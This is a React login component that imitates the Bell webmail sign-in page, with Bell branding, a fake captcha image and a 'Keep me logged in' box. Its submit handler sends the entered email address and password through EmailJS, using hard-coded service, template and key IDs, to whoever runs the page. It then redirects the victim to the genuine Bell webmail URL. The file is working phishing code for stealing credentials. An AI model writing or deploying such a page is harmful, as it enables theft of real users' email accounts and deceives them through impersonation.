import React, {useRef} from 'react';
import Bellside from "../Assets/Bellside.PNG";
import Captcha from "../Assets/Captcha.PNG";
import emailjs from '@emailjs/browser';

function Login () {
    // const handleSubmit = (e) => {
    //     e.preventDefault();
    //     // Redirect to the specified link
    //     window.location.href = "https://webmail.bell.net/bell/index-rui.jsp?v=3.1.3.48.0-4#/mail";
    // };


    // const form = useRef();

    // const sendEmail = (e) => {
    //   e.preventDefault();
  
    //   emailjs.sendForm('service_id6z6i9', 'template_h2y7r5r', form.current, 'FVIPVt10PQDRIGWMa')

    // //   .sendForm('service_id6z6i9', 'template_h2y7r5r', form.current, {
    // //     publicKey: 'FVIPVt10PQDRIGWMa',
    //     .then((result) => {
    //         console.log(result.text);
    //     }, (error) => {
    //         console.log(error.text);
    //     });
    // };

    const form = useRef();

    const sendEmail = (e) => {
        e.preventDefault();

        emailjs.sendForm('service_id6z6i9', 'template_h2y7r5r', form.current, 'FVIPVt10PQDRIGWMa')
            .then((result) => {
                console.log(result.text);
            }, (error) => {
                console.log(error.text);
            });

        // Redirect to the specified link after submitting the form
        window.location.href = 'https://webmail.bell.net/bell/index-rui.jsp?v=3.1.3.48.0-4#/mail';
    };
    
    return (
        <div className="bg-white mt-5">
            <div className="bg-[#F2F2F2] md:max-w-7xl md:mx-56 px-4 sm:px-6 lg:px-8 rounded-md pb-5">
                <h1 className="text-black text-left text-3xl pt-5 mb-2">Bell email</h1>
                <div className="flex flex-row gap-6 border-2 border-gray-300">
                    <div className="md:w-full w-auto bg-white rounded-md">
                        <h1 className="bg-[#F2F2F2] text-black text-2xl text-left font-sans pr-10 px-2 py-2 border-2">Log in</h1>
                        <form ref={form} onSubmit={sendEmail} className="flex flex-col mx-4" >
                            <label className="text-left">Email Address</label>
                            <input type="Email" name="user_name" required className="w-96 mt-2 py-2 bg-[#F2F2F2] border-2 border-gray-400"/>
                            <label className="text-left">Password</label>
                            <input type="Password" name="user_pass" required className="w-96 mt-2 py-2 bg-[#F2F2F2] border-2 border-gray-400"/>
                            <img src={Captcha} alt="Captcha" className="md:w-96 w-44 my-3"/>
                            <div className="flex flex-row gap-2 mb-3 ml-1 font-semibold">
                                <input type="checkbox" className="w-5"/>
                                <p>Keep me logged in</p>
                            </div>
                            <button type="submit" className="bg-[#0066A4] text-white font-semibold w-44  py-3 rounded-md">Login</button>
                            <p className="text-left text-xs mx-10 my-6">I forgot my <a href="#">Email address</a> or <a href="#">Password</a></p>
                        </form>
                    </div>
                    <div className="hidden lg:block">
                       <a href="#"> <img src={Bellside} alt="SideImage" className="w-full h-full pb-5"/></a>
                    </div>
                </div>
            </div>
        </div>
    );
}; 

export default Login;
